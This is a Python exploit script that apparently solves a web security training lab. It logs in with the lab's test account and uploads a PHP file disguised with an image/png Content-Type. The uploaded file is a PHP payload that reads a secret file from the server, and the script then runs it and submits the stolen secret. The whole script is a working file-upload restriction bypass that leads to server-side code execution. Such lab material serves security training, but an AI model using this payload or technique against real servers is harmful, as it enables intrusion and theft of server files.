# Web shell upload via Content-Type restriction bypass

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_wiener(s, url):
	print('\n[+] Trying to log in as Wiener...')
	account_path = url + '/my-account'
	login_path = url + '/login'
	r = s.get(account_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	login_data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	return r

def get_secret(s, url):
	print('\n[+] Trying to upload a php file as image/png...')
	upload_path = url + '/my-account/avatar'
	account_path = url + '/my-account'
	exploit_content = "<?php echo file_get_contents('/home/carlos/secret'); ?>"
	print('[+] Upload php payload:\n\t%s\n' % exploit_content)
	exploit_files = {'avatar': ('gwyo.php', exploit_content, 'image/png')}
	r = s.get(account_path)
	csrf_token = get_csrf_token(r)
	upload_data = {'csrf': csrf_token, 'user': 'wiener'}
	avatar_url = url + '/files/avatars/gwyo.php'
	print('[+] Navigating to:\n\t%s' % avatar_url)
	r = s.post(upload_path, files=exploit_files, data=upload_data)
	time.sleep(1)
	print(r)
	r = s.get(avatar_url)
	print(r.text)
	time.sleep(1)
	return r.text

def submit_secret(s, url, secret):
	print('\n[+] Trying to submit the API key to solve the lab...')
	submit_path = url + '/submitSolution'
	submit_data = {"answer": secret}
	r = s.post(submit_path, data=submit_data)
	return r

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Web shell upload via Content-Type restriction bypass')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to retrieve Carlos secret file...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = connect_as_wiener(s, url)
			time.sleep(2)
			secret = get_secret(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = submit_secret(s, url, secret)
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
